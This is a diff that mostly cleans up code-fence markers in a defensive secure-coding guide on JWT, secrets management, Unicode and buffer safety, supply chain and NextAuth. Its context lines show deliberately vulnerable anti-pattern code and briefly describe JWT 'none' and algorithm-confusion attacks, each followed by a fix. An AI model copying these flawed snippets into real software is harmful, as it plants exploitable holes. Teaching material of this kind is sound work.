@@ -5857,7 +5845,7 @@ def validate_with_guard(pattern, text):
         raise ValueError("Input too long")
     return re.match(pattern, text)
 
-```text
+```
 
 ### UNICODE NORMALIZATION ATTACKS
 
@@ -5881,8 +5869,6 @@ def check_username(username):
 # Attacker passes: (circled letters)
 
 # Filter passes. Database normalizes to 'admin'
-
-```text
 
 ```python
 
@@ -5924,7 +5910,7 @@ def safe_lowercase(text: str, locale: str = 'en') -> str:
     import icu  # PyICU
     return icu.UnicodeString(text).toLower(icu.Locale(locale))
 
-```text
+```
 
 ### BUFFER OVERFLOW PREVENTION PATTERNS
 
@@ -5948,8 +5934,6 @@ void off_by_one(char *input) {
         buffer[i] = input[i];
     }
 }
-
-```text
 
 ```c
 // TITAN: Bounded string operations
@@ -5977,7 +5961,7 @@ void safe_copy(char *input) {
 //     buffer
 // }
 
-```text
+```
 
 #### END OF VOLUME 1.7: TITAN GEMINI RESEARCH - ADVANCED ATTACK PATTERNS
 
@@ -6002,8 +5986,6 @@ function verifyToken(token: string) {
     return jwt.verify(token, SECRET_KEY);  // Accepts ANY algorithm!
 }
 // Attacker sets header: {"alg": "none"}, removes signature = valid token
-
-```text
 
 ```typescript
 // TITAN: Strict JWT verification
@@ -6115,7 +6097,7 @@ class JWTService {
     }
 }
 
-```text
+```
 
 ### SECRETS MANAGEMENT WITH VAULT
 
@@ -6138,8 +6120,6 @@ AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"  # Hardcoded!
 # Or slightly better but still dangerous
 
 AWS_KEY = os.getenv("AWS_KEY")  # In .env, might get committed
-
-```text
 
 ```python
 
@@ -6267,7 +6247,7 @@ api_key = vault.get_secret('myapp/config', 'stripe_api_key')
 
 db_user, db_pass = vault.get_dynamic_database_credentials('myapp-readonly')
 
-```text
+```
 
 ### API KEY ROTATION
 
@@ -6289,8 +6269,6 @@ def get_data(api_key: str = Header()):
     if api_key != API_KEY:
         raise HTTPException(401)
     return {"data": "secret"}
-
-```text
 
 ```python
 
@@ -6444,7 +6422,7 @@ class APIKeyManager:
             stored_hash
         )
 
-```text
+```
 
 #### END OF VOLUME 2: TITAN GEMINI RESEARCH - AUTH AND SECRETS PRODUCTION
 
@@ -6466,8 +6444,6 @@ class APIKeyManager:
 # VIBE: No dependency scanning
 
 # Just run npm install and hope nothing bad happens
-
-```text
 
 ```yaml
 
@@ -6546,8 +6522,6 @@ jobs:
       * uses: github/codeql-action/upload-sarif@v2
         with:
           sarif_file: trivy-results.sarif
-
-```text
 
 ```python
 
@@ -6659,7 +6633,7 @@ class DependencyMonitor:
 
         await self._send_slack(message)
 
-```text
+```
 
 ### CONTAINER IMAGE SIGNING
 
@@ -6677,8 +6651,6 @@ class DependencyMonitor:
 spec:
   containers:
   * image: registry.io/app:latest  # Anyone could have pushed this
-
-```text
 
 ```yaml
 
@@ -6729,8 +6701,6 @@ jobs:
             --type spdxjson \
             ghcr.io/${{ github.repository }}@${{ steps.build.outputs.digest }}
 
-```text
-
 ```yaml
 
 # TITAN: Kubernetes admission controller for signature verification
@@ -6769,7 +6739,7 @@ spec:
                       operator: GreaterThan
                       value: "2024-01-01T00:00:00Z"
 
-```text
+```
 
 #### END OF VOLUME 3: TITAN GEMINI RESEARCH - SUPPLY CHAIN SECURITY
 
@@ -6832,7 +6802,7 @@ class SecureQueryBuilder {
   }
 }
 
-```text
+```
 
 ---
 
@@ -6903,7 +6873,7 @@ function SafeUserContent({ content }: { content: string }) {
   );
 }
 
-```text
+```
 
 ---
 
@@ -6998,7 +6968,7 @@ class PasswordService {
   }
 }
 
-```text
+```
 
 ---
 
@@ -7110,7 +7080,7 @@ async function bruteForceMiddleware(req: Request, res: Response, next: NextFunct
   next();
 }
 
-```text
+```
 
 ---
 
@@ -7189,7 +7159,7 @@ async function createDBConnection() {
   });
 }
 
-```text
+```
 
 ---
 
@@ -7211,7 +7181,7 @@ async function createDBConnection() {
 
 #### The Error
 
-```text
+```
 User logs in successfully but:
 
 * Redirects to home page as unauthenticated
@@ -7220,7 +7190,7 @@ User logs in successfully but:
 
 * Protected routes are inaccessible
 
-```text
+```
 
 #### Real Causes and Fixes
 
@@ -7238,7 +7208,7 @@ User logs in successfully but:
 // npx auth secret
 // OR: openssl rand -base64 32
 
-```text
+```
 
 #### Cause 2: Missing NEXTAUTH_URL in Production
 
@@ -7252,7 +7222,7 @@ User logs in successfully but:
 // For Vercel: Automatically inferred, but set it anyway
 // For other providers: REQUIRED
 
-```text
+```
 
 #### Cause 3: Credentials Provider + Database Adapter Conflict
 
@@ -7284,7 +7254,7 @@ export const authOptions = {
   ]
 };
 
-```text
+```
 
 #### Cause 4: useSession Not Updating After Login
 
@@ -7320,7 +7290,7 @@ function LoginForm() {
   }
 }
 
-```text
+```
 
 ---
 
@@ -7328,11 +7298,11 @@ function LoginForm() {
 
 #### OAuth Callback URL Mismatch
 
-```text
+```
 Error: OAUTH_CALLBACK_HANDLER_ERROR
 Message: "The redirect_uri does not match the registered callback URL"
 
-```text
+```
 
 #### Fix
 
@@ -7353,14 +7323,14 @@ Message: "The redirect_uri does not match the registered callback URL"
 // ? WRONG (www subdomain):
 // https://www.your-app.com/api/auth/callback/google
 
-```text
+```
 
 #### File Name Case Sensitivity
 
-```text
+```
 Error: MISSING_NEXTAUTH_API_ROUTE_ERROR
 
-```text
+```
 
 #### Fix
 
@@ -7377,7 +7347,7 @@ Error: MISSING_NEXTAUTH_API_ROUTE_ERROR
 git mv 'pages/api/auth/[...nextAuth].ts' 'pages/api/auth/[...nextauth-temp].ts'
 git mv 'pages/api/auth/[...nextauth-temp].ts' 'pages/api/auth/[...nextauth].ts'
 
-```text
+```
 
 ---
 
@@ -7476,13 +7446,13 @@ declare module "next-auth/jwt" {
   }
 }
 
-```text
+```
 
 ---
 
 ### DECISION TREE: NEXTAUTH TROUBLESHOOTING
 
-```text
+```
 NEXTAUTH ISSUE
 
 +- Session doesn't persist after login?
@@ -7510,13 +7480,13 @@ NEXTAUTH ISSUE
     +- Enable debug: true temporarily to see logs
     +- Check Vercel/server logs for errors
 
-```text
+```
 
 ---
 
 ### PRODUCTION CHECKLIST
 
-```text
+```
 Before Deploying NextAuth:
 
 [ ] NEXTAUTH_SECRET set (not from .env.local)
@@ -7529,7 +7499,7 @@ Before Deploying NextAuth:
 [ ] SessionProvider wraps _app.tsx or layout.tsx
 [ ] Auth middleware protects correct routes
 
-```text
+```
 
 ---
 
@@ -7549,12 +7519,12 @@ Before Deploying NextAuth:
 
 #### Algorithm Confusion Attack (Most Common)
 
-```text
+```
 Attacker changes "alg": "RS256" to "alg": "HS256"
 Server uses PUBLIC key as HMAC secret.
 Attacker signs with public key ? Valid token!
 
-```text
+```
 
 #### Real Fix: Whitelist Algorithms
 
@@ -7574,15 +7544,15 @@ const { payload } = await jwtVerify(token, publicKey, {
   audience: 'your-app'
 });
 
-```text
+```
 
 #### "none" Algorithm Attack
 
-```text
+```
 Attacker sets "alg": "none"
 Server accepts token without signature!
 
-```text
+```
 
 #### Real Fix
 
@@ -7592,7 +7562,7 @@ const decoded = jwt.verify(token, secret, {
   algorithms: ['HS256', 'RS256'],  // Explicit whitelist, never 'none'
 });
 
-```text
+```
 
 ---
 
@@ -7600,11 +7570,11 @@ const decoded = jwt.verify(token, secret, {
 
 #### The Problem
 
-```text
+```
 Access token stolen ? Attacker has access for token lifetime
 Refresh token stolen ? Attacker has indefinite access!
 
-```text
+```
 
 #### Real Fix: Rotate on Every Use
 
@@ -7666,7 +7636,7 @@ async function refreshAccessToken(refreshToken: string) {
   };
 }
 
-```text
+```
 
 ---
 
@@ -7700,7 +7670,7 @@ res.cookie('refreshToken', refreshToken, {
   path: '/api/auth/refresh'  // Only sent to refresh endpoint
 });
 
-```text
+```
 
 ---
 
@@ -7729,7 +7699,7 @@ const TOKEN_CONFIG = {
   },
 };
 
-```text
+```
 
 ---
 
@@ -7770,13 +7740,13 @@ async function logout(req, res) {
   res.json({ success: true });
 }
 
-```text
+```
 
 ---
 
 ### DECISION TREE: JWT DEBUGGING
 
-```text
+```
 JWT ISSUE
 
 +- Token rejected as invalid?
@@ -7806,7 +7776,7 @@ JWT ISSUE
     +- Revoke refresh tokens on server
     +- Consider token blacklist for access tokens
 
-```text
+```
 
 ---
 
@@ -7841,7 +7811,7 @@ const jwtSecurityChecklist = {
   cors: 'credentials: include with specific origins',
 };
 
-```text
+```
 
 ---
 
@@ -7883,7 +7853,7 @@ const { rows } = await pool.query(
   [email]
 );  // Safe - parameterized
 
-```text
+```
 
 ---
 
@@ -7926,7 +7896,7 @@ module.exports = {
   }
 };
 
-```text
+```
 
 ---
 
@@ -7974,7 +7944,7 @@ res.cookie('session', sessionId, {
 });
 // Browser won't send cookie with cross-site requests!
 
-```text
+```
 
 ---
 
@@ -8004,7 +7974,7 @@ export function middleware(request: NextRequest) {
   return response;
 }
 
-```text
+```
 
 ---
 
@@ -8046,13 +8016,13 @@ const fileSchema = z.object({
   size: z.number().max(5 * 1024 * 1024),  // 5MB max
 });
 
-```text
+```
 
 ---
 
 ### DECISION TREE: SECURITY AUDIT
 
-```text
+```
 SECURITY CHECK
 
 +- User input?
@@ -8085,7 +8055,7 @@ SECURITY CHECK
     +- HSTS enabled
     +- Referrer-Policy set
 
-```text
+```
 
 ---
 
@@ -8116,7 +8086,7 @@ const user = await prisma.user.findUnique({
 const userIdSchema = z.string().uuid();
 const validatedId = userIdSchema.parse(userId);
 
-```text
+```
 
 ---
 
@@ -8162,7 +8132,7 @@ const securityHeaders = [
   }
 ];
 
-```text
+```
 
 ---
 
@@ -8218,7 +8188,7 @@ function csrfMiddleware(req: Request, res: Response, next: NextFunction) {
   next();
 }
 
-```text
+```
 
 ---
 
@@ -8259,7 +8229,7 @@ const passwordSchema = z
   .regex(/[0-9]/, 'Password must contain a number')
   .regex(/[^A-Za-z0-9]/, 'Password must contain a special character');
 
-```text
+```
 
 ---
 
@@ -8315,7 +8285,7 @@ async function apiKeyAuth(req: Request, res: Response, next: NextFunction) {
   next();
 }
 
-```text
+```
 
 ---
 
